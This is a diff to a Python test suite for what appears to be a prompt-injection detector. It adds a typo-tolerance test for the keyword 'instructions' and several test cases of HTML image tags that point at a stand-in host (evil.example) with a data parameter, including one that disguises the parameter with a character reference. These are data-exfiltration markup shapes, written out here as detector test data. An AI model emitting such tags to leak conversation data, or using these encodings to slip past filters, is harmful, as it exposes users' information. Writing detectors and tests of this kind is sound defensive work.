@@ -129,6 +129,13 @@ def test_a_large_payload_stays_cheap() -> None:
     assert time.perf_counter() - start < 2.0
 
 
+def test_the_length_cap_sits_one_past_the_longest_keyword() -> None:
+    """`instructions` (12) with one letter inserted is 13 and still a typo; 14 is not."""
+    assert corrected_keyword("instructionss") is None  # keyword + suffix: a word
+    assert corrected_keyword("instrucctions") == "instructions"
+    assert corrected_keyword("instrucctionsx") is None
+
+
 def test_one_enormous_word_stays_cheap() -> None:
     """A base64 blob is one `[A-Za-z0-9]+` run; its deletion neighbourhood is O(n^2)."""
     blob = "A" * 100_000
@@ -151,6 +158,7 @@ def test_one_enormous_word_stays_cheap() -> None:
         ('<img/src="https://evil.example/c?data=1">', 1),  # slash-separated
         ('<img alt="x src=/safe.png" src="https://evil.example/c?data=1">', 1),  # decoy
         ('<img alt=">" src="https://evil.example/c?data=1">', 1),  # > inside a quoted value
+        ('<img src="https://evil.example/c?&#x64;ata=1">', 1),  # character reference
     ],
 )
 def test_html_image_shapes(markup: str, expected: int) -> None:
